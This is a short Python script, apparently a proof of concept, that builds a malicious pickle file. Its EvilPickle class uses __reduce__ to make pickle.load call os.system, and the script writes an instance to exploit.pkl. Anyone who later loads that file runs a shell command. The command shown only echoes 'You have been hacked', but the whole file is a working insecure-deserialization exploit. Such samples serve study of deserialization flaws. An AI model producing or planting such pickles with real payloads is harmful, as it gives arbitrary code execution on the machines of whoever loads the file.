import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked"',))

def serialize_exploit():
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(EvilPickle(), f)

serialize_exploit()
